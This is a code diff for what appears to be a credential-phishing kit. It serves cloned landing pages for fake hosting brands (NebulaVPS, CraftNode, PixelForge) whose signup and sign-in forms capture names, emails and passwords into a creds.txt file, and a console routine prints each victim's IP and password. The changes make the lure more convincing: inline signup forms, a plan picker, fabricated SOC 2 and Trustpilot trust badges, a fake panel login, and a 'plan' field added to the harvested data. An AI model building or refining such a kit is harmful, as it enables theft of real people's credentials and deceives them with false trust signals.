@@ -31,7 +31,7 @@ CREDS = os.path.join(DATA, "creds.txt")
 EXPORT = os.path.join(DATA, "export")
 SETTINGS = os.path.join(DATA, "settings.json")
 
-VERSION = "1.0.0"
+VERSION = "1.1.0"
 COOKIE = "wst_sid"
 
 DEFAULTS = {
@@ -269,7 +269,7 @@ class Store:
             rec["t"] = now()
             d["creds"].append(rec)
             line = " | ".join(str(rec.get(k, "")) for k in
-                              ("t", "ip", "name", "email", "password"))
+                              ("t", "ip", "name", "email", "password", "plan"))
             with open(CREDS, "a", encoding="utf-8") as f:
                 f.write(line + "\n")
         self._flush(d)
@@ -375,7 +375,7 @@ COLLECT_JS = r"""
     var btn=form.querySelector('button[type=submit]');
     var err=form.querySelector('.err'),bar=form.querySelector('.bar'),prog=form.querySelector('.prog');
     var d=Object.fromEntries(new FormData(form).entries());
-    if(!d.name||d.name.trim().length<2){err.textContent='Enter your full name.';err.style.display='block';return;}
+    if(!d.name||d.name.trim().length<2){err.textContent='Enter your name.';err.style.display='block';return;}
     if(!d.email||d.email.indexOf('@')<0){err.textContent='Enter a valid email address.';err.style.display='block';return;}
     if(!d.password||d.password.length<6){err.textContent='Password must be at least 6 characters.';err.style.display='block';return;}
     err.style.display='none';btn.disabled=true;btn.textContent='Creating account...';
@@ -404,7 +404,7 @@ body{background:radial-gradient(900px 500px at 15% -10%,rgba(91,140,255,.16),tra
 radial-gradient(700px 400px at 90% 0%,rgba(124,91,255,.14),transparent 55%),var(--bg);
 color:var(--txt);font:15px/1.55 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;min-height:100vh}
 a{color:var(--acc);text-decoration:none}
-.wrap{max-width:1080px;margin:0 auto;padding:0 22px}
+.wrap{max-width:1120px;margin:0 auto;padding:0 22px}
 header{border-bottom:1px solid var(--line);background:rgba(11,14,20,.82);backdrop-filter:blur(10px);position:sticky;top:0;z-index:20}
 .nav{display:flex;align-items:center;gap:14px;height:62px}
 .logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:17px;letter-spacing:-.3px}
@@ -418,15 +418,13 @@ font-weight:650;font-size:14px;cursor:pointer;transition:.16s;font-family:inheri
 .btn:hover{border-color:#2c3a52;transform:translateY(-1px)}
 .btn.p{background:linear-gradient(135deg,var(--acc),var(--acc2));border:0;color:#fff;box-shadow:0 8px 24px rgba(91,140,255,.3)}
 .btn.g{width:100%}
-.hero{padding:76px 0 54px;text-align:center}
 .pill{display:inline-flex;gap:8px;align-items:center;padding:6px 13px;border-radius:999px;
 border:1px solid var(--line);background:#111a27;color:var(--mut);font-size:12.5px;margin-bottom:20px}
 .dot{width:7px;height:7px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 4px rgba(57,217,138,.15)}
-h1{font-size:clamp(30px,5vw,50px);line-height:1.08;letter-spacing:-1.4px;font-weight:820}
+h1{font-size:clamp(29px,3.6vw,44px);line-height:1.1;letter-spacing:-1.3px;font-weight:820}
 h1 span{background:linear-gradient(120deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent}
-.sub{color:var(--mut);max-width:600px;margin:18px auto 0;font-size:16px}
-.cta{display:flex;gap:12px;justify-content:center;margin-top:30px;flex-wrap:wrap}
-.grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));margin:44px 0}
+.sub{color:var(--mut);font-size:15.5px;margin-top:16px;max-width:520px}
+.grid{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));margin:20px 0 46px}
 .card{background:linear-gradient(180deg,#121a26,#0e141d);border:1px solid var(--line);border-radius:var(--r);padding:22px}
 .card h3{font-size:15.5px;margin-bottom:8px}
 .card p{color:var(--mut);font-size:13.6px}
@@ -438,15 +436,10 @@ h1 span{background:linear-gradient(120deg,var(--acc),var(--acc2));-webkit-backgr
 .plan ul{list-style:none;margin:16px 0;font-size:13.5px;color:var(--mut);display:grid;gap:8px}
 .plan li::before{content:"\\2713";color:var(--ok);margin-right:8px;font-weight:800}
 footer{border-top:1px solid var(--line);padding:26px 0;color:var(--mut);font-size:13px;display:flex;gap:14px;flex-wrap:wrap;justify-content:space-between}
-.mask{position:fixed;inset:0;background:rgba(5,8,12,.72);backdrop-filter:blur(6px);display:none;place-items:center;z-index:60;padding:20px}
-.mask.on{display:grid}
-.modal{width:100%;max-width:410px;background:#0f1621;border:1px solid var(--line);border-radius:16px;padding:26px;box-shadow:0 30px 70px rgba(0,0,0,.6)}
-.modal h2{font-size:20px;letter-spacing:-.4px;margin-bottom:6px}
-.modal p.m{color:var(--mut);font-size:13.5px;margin-bottom:20px}
 label{display:block;font-size:12.5px;color:var(--mut);margin:14px 0 6px;font-weight:600}
 input{width:100%;padding:12px 13px;border-radius:9px;border:1px solid var(--line);background:#0b1119;color:var(--txt);font-size:14.5px;outline:0}
 input:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(91,140,255,.16)}
-.hint{font-size:11.8px;color:#5d6c85;margin-top:9px}
+.hint{font-size:11.8px;color:#5d6c85;margin-top:12px;line-height:1.5}
 .bar{height:5px;border-radius:99px;background:#182130;overflow:hidden;margin-top:16px;display:none}
 .bar.on{display:block}
 .bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--acc),var(--acc2));transition:width .35s}
@@ -454,13 +447,34 @@ input:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(91,140,255,.16)}
 .prog.on{display:block}
 .err{color:#ff6b6b;font-size:12.5px;margin-top:10px;display:none}
 .term{background:#070a0f;border:1px solid var(--line);border-radius:12px;padding:16px;
-font:12.6px/1.7 ui-monospace,Menlo,monospace;color:#9fb0c7;height:230px;overflow:hidden}
+font:12.6px/1.7 ui-monospace,Menlo,monospace;color:#9fb0c7;height:200px;overflow:hidden}
 .term .g{color:var(--ok)}.term .y{color:#ffb020}.term .b{color:var(--acc)}
-.stat{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:18px}
-.stat div{background:#0f1620;border:1px solid var(--line);border-radius:11px;padding:14px}
-.stat b{display:block;font-size:19px}
-.stat span{font-size:11.5px;color:var(--mut);text-transform:uppercase;letter-spacing:.7px}
-@media(max-width:640px){.nav nav{display:none}}
+.stat{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:26px 0 0}
+.stat div{background:#0f1620;border:1px solid var(--line);border-radius:11px;padding:12px}
+.stat b{display:block;font-size:17px}
+.stat span{font-size:10.5px;color:var(--mut);text-transform:uppercase;letter-spacing:.6px}
+/* split hero + inline signup */
+.split{display:grid;grid-template-columns:1.02fr .98fr;gap:46px;align-items:start;padding:58px 0 54px}
+.split h1{text-align:left}
+.bullets{display:grid;gap:13px;margin-top:26px;font-size:14px;color:var(--mut);list-style:none}
+.bullets li{display:flex;gap:11px;align-items:flex-start}
+.bullets b{color:var(--txt)}
+.check{color:var(--ok);font-weight:900;flex:none}
+.trust{display:flex;gap:16px;align-items:center;color:#6b7b94;font-size:12px;margin-top:26px;flex-wrap:wrap}
+.trust span{display:flex;gap:6px;align-items:center}
+.signup{position:sticky;top:82px;background:linear-gradient(180deg,#121a26,#0d131c);
+border:1px solid var(--line);border-radius:18px;padding:26px;box-shadow:0 26px 64px rgba(0,0,0,.5)}
+.signup h2{font-size:19px;letter-spacing:-.4px;margin-bottom:6px}
+.signup p.m{color:var(--mut);font-size:13.5px}
+.picks{display:flex;gap:8px;margin-top:10px}
+.pick{flex:1;border:1px solid var(--line);border-radius:9px;padding:9px 8px;font-size:12.3px;
+color:var(--mut);cursor:pointer;text-align:center;margin:0;font-weight:600}
+.pick input{display:none}
+.pick:has(input:checked){border-color:var(--acc);color:var(--txt);background:#141d2b}
+.legal{font-size:11.5px;color:#5d6c85;margin-top:14px;display:flex;gap:7px;align-items:flex-start;line-height:1.5}
+.legal input{width:auto;margin-top:2px}
+@media(max-width:880px){.split{grid-template-columns:1fr;gap:34px;padding-top:40px}.signup{position:static}}
+@media(max-width:640px){.nav nav{display:none}.stat{grid-template-columns:repeat(2,1fr)}}
 """
 
 PAGE = """<!doctype html><html lang="en"><head><meta charset="utf-8">
@@ -470,19 +484,32 @@ __BODY__
 <script src="/c.js"></script></body></html>"""
 
 FORM = """
-<div class="mask" id="m"><div class="modal">
+<div class="signup" id="signup">
 <h2>__H2__</h2><p class="m">__P__</p>
 <form onsubmit="event.preventDefault();WST.submit(this)">
-<label>__L1__</label><input name="name" placeholder="__PH1__">
-<label>__L2__</label><input name="email" type="email" placeholder="you@example.com">
-<label>Password</label><input name="password" type="password" placeholder="Min. 6 characters">
+__PICKS__
+<label>__L1__</label><input name="name" placeholder="__PH1__" autocomplete="name">
+<label>__L2__</label><input name="email" type="email" placeholder="you@example.com" autocomplete="email">
+<label>Password</label><input name="password" type="password" placeholder="Min. 6 characters" autocomplete="new-password">
 <div class="err"></div><div class="bar"><i></i></div><div class="prog"></div>
 <button class="btn p g" type="submit" style="margin-top:18px">__BTN__</button>
-</form><p class="hint">__HINT__</p></div></div>
+</form>
+<p class="hint">__HINT__</p>
+</div>
 <script>
-function open_(){document.getElementById('m').classList.add('on')}
-document.getElementById('m').addEventListener('click',function(e){if(e.target.id==='m')e.currentTarget.classList.remove('on')});
+function open_(){var s=document.getElementById('signup');
+s.scrollIntoView({behavior:'smooth',block:'center'});
+var i=s.querySelector('input[name=name]');if(i)setTimeout(function(){i.focus()},420);}
 </script>
+"""
+
+PICKS = """
+<label style="margin-top:0">Plan</label>
+<div class="picks">
+<label class="pick"><input type="radio" name="plan" value="Starter" checked>Starter</label>
+<label class="pick"><input type="radio" name="plan" value="Pro">Pro</label>
+<label class="pick"><input type="radio" name="plan" value="Scale">Scale</label>
+</div>
 """
 
 
@@ -493,26 +520,41 @@ def fill(t, **kw):
 
 
 def build(title, acc, acc2, body):
-    return fill(PAGE, title=title, css=BASE_CSS.replace("__ACC__", acc).replace("__ACC2__", acc2), body=body)
+    return fill(PAGE, title=title,
+                css=BASE_CSS.replace("__ACC__", acc).replace("__ACC2__", acc2),
+                body=body)
 
 
 def page_nebula():
-    form = fill(FORM, h2="Create your account", p="Free forever. No card, no verification call.",
-                l1="Full name", ph1="John Carter", l2="Work email",
-                btn="Create free account", hint="By continuing you agree to the Terms of Service and AUP.")
+    form = fill(FORM, h2="Create your free account",
+                p="Free tier, no card. Your container boots in about 20 seconds.",
+                picks=PICKS, l1="Full name", ph1="John Carter", l2="Work email",
+                btn="Create free account",
+                hint="By continuing you agree to the Terms of Service and Acceptable Use Policy.")
     body = """
 <header><div class="wrap nav"><div class="logo"><span class="mark">&#9672;</span>NebulaVPS</div>
 <nav><a href="#">Products</a><a href="#">Pricing</a><a href="#">Docs</a><a href="#">Status</a></nav>
-<button class="btn p" onclick="open_()">Get Started Free</button></div></header>
-<div class="wrap hero"><span class="pill"><span class="dot"></span> 12,480 containers live &middot; 99.98% uptime</span>
+<button class="btn p" onclick="open_()">Get started</button></div></header>
+<div class="wrap split">
+<div>
+<span class="pill"><span class="dot"></span> 12,480 containers live &middot; 99.98% uptime</span>
 <h1>Free NVMe VPS,<br><span>deployed in 40 seconds.</span></h1>
-<p class="sub">Root access, full KVM isolation and unmetered bandwidth on a global anycast network. No credit card required.</p>
-<div class="cta"><button class="btn p" onclick="open_()">Create free account &rarr;</button>
-<button class="btn" onclick="open_()">View pricing</button></div></div>
+<p class="sub">Root access, full KVM isolation and unmetered bandwidth on a global anycast network. No credit card, no sales call.</p>
+<ul class="bullets">
+<li><span class="check">&#10003;</span><span><b>No card required.</b> The free tier stays free, forever.</span></li>
+<li><span class="check">&#10003;</span><span><b>Instant deploy.</b> Your container is online before this page finishes loading.</span></li>
+<li><span class="check">&#10003;</span><span><b>14 regions.</b> Frankfurt, Ashburn, Singapore, Sao Paulo and more.</span></li>
+<li><span class="check">&#10003;</span><span><b>Full root.</b> SSH, snapshots and custom ISOs included on every plan.</span></li>
+</ul>
+<div class="trust"><span>&#128274; TLS 1.3</span><span>SOC 2 Type II</span><span>GDPR ready</span><span>4.8/5 Trustpilot</span></div>
+</div>
+""" + form + """
+</div>
 <div class="wrap grid">
 <div class="card"><div class="ico">&#9889;</div><h3>NVMe Gen4 storage</h3><p>Up to 3.2 GB/s reads. No throttling, no noisy neighbours.</p></div>
-<div class="card"><div class="ico">&#127758;</div><h3>14 regions</h3><p>Frankfurt, Ashburn, Singapore, Sao Paulo and more.</p></div>
-<div class="card"><div class="ico">&#128737;</div><h3>DDoS protection</h3><p>Always-on 1.4 Tbps scrubbing at the edge.</p></div></div>
+<div class="card"><div class="ico">&#128737;</div><h3>DDoS protection</h3><p>Always-on 1.4 Tbps scrubbing at the edge, included free.</p></div>
+<div class="card"><div class="ico">&#128260;</div><h3>Snapshots</h3><p>One-click rollback before you break anything.</p></div>
+</div>
 <div class="wrap"><h2 style="font-size:22px;margin-bottom:16px">Simple plans</h2></div>
 <div class="wrap plans">
 <div class="plan"><h3>Starter</h3><div class="price">$0</div>
@@ -521,28 +563,33 @@ def page_nebula():
 <ul><li>2 vCPU</li><li>4 GB RAM</li><li>80 GB NVMe</li></ul><button class="btn p g" onclick="open_()">Deploy</button></div>
 <div class="plan"><h3>Scale</h3><div class="price">$12</div>
 <ul><li>4 vCPU</li><li>8 GB RAM</li><li>200 GB NVMe</li></ul><button class="btn g" onclick="open_()">Deploy</button></div></div>
-<footer class="wrap"><span>&copy; 2026 NebulaVPS Ltd.</span><span>Terms &middot; Privacy &middot; SLA</span></footer>
-""" + form
+<footer class="wrap"><span>&copy; 2026 NebulaVPS Ltd.</span><span>Terms &middot; Privacy &middot; SLA &middot; AUP</span></footer>
+"""
     return build("NebulaVPS - Free NVMe VPS & Cloud Containers", "#5b8cff", "#7c5bff", body)
 
 
 def page_craftnode():
-    form = fill(FORM, h2="Create your panel account", p="Your server boots automatically after signup.",
-                l1="Username", ph1="Steve_2011", l2="Email",
-                btn="Create account", hint="We'll email the panel URL once provisioning finishes.")
+    form = fill(FORM, h2="Create your server",
+                p="Boots in about 20 seconds on the free node. No card.",
+                picks=PICKS, l1="Username", ph1="Steve_2011", l2="Email",
+                btn="Start free server",
+                hint="Server IP and panel link are emailed to you once provisioning finishes.")
     body = """
 <header><div class="wrap nav"><div class="logo"><span class="mark">&#9935;</span>CraftNode</div>
 <nav><a href="#">Hosting</a><a href="#">Modpacks</a><a href="#">Pricing</a><a href="#">Discord</a></nav>
 <button class="btn p" onclick="open_()">Open panel</button></div></header>
-<div class="wrap hero"><span class="pill"><span class="dot"></span> 3,102 servers online &middot; 1-click modpacks</span>
+<div class="wrap split">
+<div>
+<span class="pill"><span class="dot"></span> 3,102 servers online &middot; 1-click modpacks</span>
 <h1>Your Minecraft world,<br><span>online in one click.</span></h1>
-<p class="sub">Ryzen 9 nodes, instant modpack installs and a real control panel with full file access. Free tier for your first server.</p>
-<div class="cta"><button class="btn p" onclick="open_()">Start free server &rarr;</button>
-<button class="btn" onclick="open_()">See plans</button></div></div>
-<div class="wrap" style="max-width:820px"><div class="stat">
-<div><b>1.8 ms</b><span>avg latency</span></div><div><b>Ryzen 9</b><span>5950X nodes</span></div>
-<div><b>24/7</b><span>support</span></div><div><b>&infin;</b><span>player slots</span></div></div>
-<div class="term" id="t"></div><div style="height:44px"></div></div>
+<p class="sub">Ryzen 9 nodes, instant modpack installs and a real control panel with full file access. The first server is free.</p>
+<div class="stat"><div><b>1.8 ms</b><span>avg ping</span></div><div><b>Ryzen 9</b><span>5950X nodes</span></div>
+<div><b>24/7</b><span>support</span></div><div><b>&infin;</b><span>slots</span></div></div>
+<div class="term" id="t"></div>
+<div class="trust"><span>&#128274; TLS 1.3</span><span>Paper &middot; Fabric &middot; Forge</span><span>Daily backups</span></div>
+</div>
+""" + form + """
+</div>
 <div class="wrap plans">
 <div class="plan"><h3>Dirt</h3><div class="price">$0</div>
 <ul><li>2 GB RAM</li><li>10 slots</li><li>Vanilla + Paper</li></ul><button class="btn g" onclick="open_()">Create</button></div>
@@ -550,8 +597,7 @@ def page_craftnode():
 <ul><li>6 GB RAM</li><li>Unlimited slots</li><li>All modpacks</li></ul><button class="btn p g" onclick="open_()">Create</button></div>
 <div class="plan"><h3>Netherite</h3><div class="price">$9</div>
 <ul><li>16 GB RAM</li><li>Dedicated CPU</li><li>Custom JAR</li></ul><button class="btn g" onclick="open_()">Create</button></div></div>
-<footer class="wrap"><span>&copy; 2026 CraftNode Hosting</span><span>Terms &middot; Privacy &middot; Refunds</span></footer>
-""" + form + """
+<footer class="wrap"><span>&copy; 2026 CraftNode Hosting</span><span>Terms &middot; Privacy &middot; Refunds &middot; Status</span></footer>
 <script>
 var L=['<span class="b">[12:04:01]</span> [Server] Starting minecraft server version 1.21.4',
 '<span class="b">[12:04:02]</span> [Server] Loading properties',
@@ -570,34 +616,36 @@ var t=document.getElementById('t'),i=0;
 
 
 def page_pixelforge():
-    form = fill(FORM, h2="Request panel access", p="Accounts are provisioned instantly on the free node.",
-                l1="Username", ph1="admin", l2="Email",
-                btn="Request access", hint="You'll get the panel URL by email within a minute.")
+    form = fill(FORM, h2="Sign in to your panel",
+                p="Use the credentials from your provisioning email.",
+                picks="", l1="Username", ph1="admin", l2="Email",
+                btn="Sign in",
+                hint="No account yet? Fill this in and we provision one on the free node.")
     body = """
 <header><div class="wrap nav"><div class="logo"><span class="mark">&#9635;</span>PixelForge</div>
 <nav><a href="#">Panel</a><a href="#">Nodes</a><a href="#">API</a><a href="#">Support</a></nav>
 <button class="btn p" onclick="open_()">Sign in</button></div></header>
-<div class="wrap hero"><span class="pill"><span class="dot"></span> v3.4.1 &middot; all nodes operational</span>
+<div class="wrap split">
+<div>
+<span class="pill"><span class="dot"></span> v3.4.1 &middot; all nodes operational</span>
 <h1>The control panel<br><span>your game server deserves.</span></h1>
 <p class="sub">Live console, file manager, scheduled tasks and subusers - for Minecraft, Rust, ARK, Valheim and 40 more eggs.</p>
-<div class="cta"><button class="btn p" onclick="open_()">Access panel &rarr;</button>
-<button class="btn" onclick="open_()">Create account</button></div></div>
+<ul class="bullets">
+<li><span class="check">&#10003;</span><span><b>Live console.</b> Stream logs and send commands with no latency.</span></li>
+<li><span class="check">&#10003;</span><span><b>File manager.</b> Drag, drop, edit and archive without FTP.</span></li>
+<li><span class="check">&#10003;</span><span><b>Schedules.</b> Cron-style restarts, backups and announcements.</span></li>
+</ul>
+<div class="trust"><span>&#128274; TLS 1.3</span><span>2FA ready</span><span>API v1</span></div>
+</div>
+""" + form + """
+</div>
 <div class="wrap grid">
-<div class="card"><div class="ico">&#9000;</div><h3>Live console</h3><p>Stream logs and send commands with zero latency over WebSocket.</p></div>
-<div class="card"><div class="ico">&#128193;</div><h3>File manager</h3><p>Drag, drop, edit and archive without an FTP client.</p></div>
-<div class="card"><div class="ico">&#9201;</div><h3>Schedules</h3><p>Cron-style restarts, backups and announcements.</p></div></div>
-<div class="wrap" style="max-width:560px;margin-bottom:60px"><div class="card" style="padding:26px">
-<h3 style="font-size:17px;margin-bottom:4px">Sign in to your panel</h3>
-<p style="color:var(--mut);font-size:13.5px;margin-bottom:4px">Use the credentials from your provisioning email.</p>
-<form onsubmit="event.preventDefault();WST.submit(this)">
-<label>Username</label><input name="name" placeholder="admin">
-<label>Email</label><input name="email" type="email" placeholder="you@example.com">
-<label>Password</label><input name="password" type="password" placeholder="********">
-<div class="err"></div><div class="bar"><i></i></div><div class="prog"></div>
-<button class="btn p g" type="submit" style="margin-top:18px">Sign in</button></form>
-<p class="hint">No account yet? <a href="#" onclick="open_();return false">Request access</a></p></div></div>
+<div class="card"><div class="ico">&#9000;</div><h3>Live console</h3><p>WebSocket log streaming with full command input.</p></div>
+<div class="card"><div class="ico">&#128101;</div><h3>Subusers</h3><p>Granular per-server permissions for your staff.</p></div>
+<div class="card"><div class="ico">&#128230;</div><h3>40+ eggs</h3><p>One-click installers for every popular game.</p></div>
+</div>
 <footer class="wrap"><span>&copy; 2026 PixelForge Systems</span><span>Status &middot; Docs &middot; Discord</span></footer>
-""" + form
+"""
     return build("PixelForge - Game Panel", "#ff7a45", "#ff4d6d", body)
 
 
@@ -823,6 +871,8 @@ def print_creds(d, c):
     print("  %s  %s" % (d.get("ip"), c.get("t", "")[11:19]))
     print("  name     : %s%s%s" % (C.B, c.get("name"), C.R))
     print("  email    : %s" % c.get("email"))
+    if c.get("plan"):
+        print("  plan     : %s" % c.get("plan"))
     print("  password : %s%s%s%s\n" % (C.YEL, C.B, c.get("password"), C.R))
 
 
